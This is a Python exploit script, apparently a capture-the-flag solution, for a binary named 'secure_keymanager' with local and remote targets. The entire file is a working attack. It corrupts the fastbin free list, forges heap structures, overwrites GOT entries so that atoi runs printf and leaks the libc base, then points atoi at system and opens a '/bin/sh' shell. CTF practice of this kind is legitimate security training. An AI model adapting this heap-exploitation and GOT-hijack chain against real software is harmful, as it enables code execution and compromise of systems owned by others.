#!/usr/bin/env python
# coding:utf-8

from ctf import *

binary = './secure_keymanager'
context.log_level = 'INFO'
context.terminal = ['tmux', 'splitw', '-h']
mode = args['MODE'].lower()
if not args['ASLR']:
    context.aslr = False
# os.environ['LD_LIBRARY_PATH'] = os.curdir

elf = context.binary = ELF(binary)
if args['LIBC']:
    libc = args['LIBC']
    os.environ['LD_PRELOAD'] = libc
else:
    libc = [x for x in elf.libs.keys() if 'libc.so' in x]
    libc = libc and libc[0] or './libc.so.6'
libc = ELF(libc)

def exploit():
    if mode == 'debug':
        io = gdb.debug(binary, gdbscript='''
            c
        ''')
    elif mode == 'remote':
        io = remote('secure_keymanager.pwn.seccon.jp', 47225)
    elif mode == 'qira':
        io = remote('0', 4000)
    else:
        io = process(binary)

    def send_account():
        io.sendafter('>>', p64(0x81))
        io.sendafter('>>', 'pass\0')

    def add_key(data, length=None, title='\0'):
        io.sendlineafter('>>', 1)
        if length is None:
            length = len(data) + 1
        io.sendlineafter('...', length)
        io.sendafter('...', title)
        io.sendafter('...', data)

    def edit_key(idx, data):
        io.sendlineafter('>>', 3)
        send_account()
        io.sendlineafter('...', idx)
        io.sendafter('...', data)

    def remove_key(idx):
        io.sendlineafter('>>', 4)
        send_account()
        io.sendlineafter('...', idx)

    send_account()

    # make fastbin free list circulate
    add_key(cyclic(0x50))
    add_key(cyclic(0x50))
    add_key(cyclic(0x50))
    remove_key(1)
    remove_key(2)
    add_key(cyclic(0x50))
    remove_key(1)
    remove_key(0)
    remove_key(2)

    # fake `key_map` and `key_list`
    add_key(cyclic(0x50), title=p64(elf.symbols['account'] - 0x8))
    add_key(cyclic(0x50))
    add_key(cyclic(0x50))
    add_key(fit({
        0: elf.got['__stack_chk_fail'] + 0x8,
        0x38: '\x01' * 4,
        0x3c: '\x00' * 4,
    }), length=0x50)

    # hijack `atoi` to `printf`
    edit_key(1, flat(
        elf.plt['read'] + 6,
        elf.plt['__libc_start_main'] + 6,
        elf.plt['strcmp'] + 6,
        elf.plt['malloc'] + 6,
        elf.plt['printf'],
    ))

    io.sendlineafter('>>', '%25$llx')
    if enhex(libc.buildid) == '3d95dfe155789b0c9253b84e94093da377f6bc9a':
        libc.address = int(io.recvline(), 16) - 0x20561 # local
    else:
        libc.address = int(io.recvline(), 16) - 0x20830 # remote
    info('libc base address: %#x', libc.address)

    # hijack `atoi` to `system`
    io.sendafter('>>', cyclic(3))
    send_account()
    io.sendafter('...', cyclic(1))
    io.sendafter('...', flat(
        elf.plt['read'] + 6,
        elf.plt['__libc_start_main'] + 6,
        elf.plt['strcmp'] + 6,
        elf.plt['malloc'] + 6,
        libc.symbols['system'],
    ))

    io.sendlineafter('>> ', '/bin/sh')

    io.interactive()

if __name__ == '__main__':
    exploit()
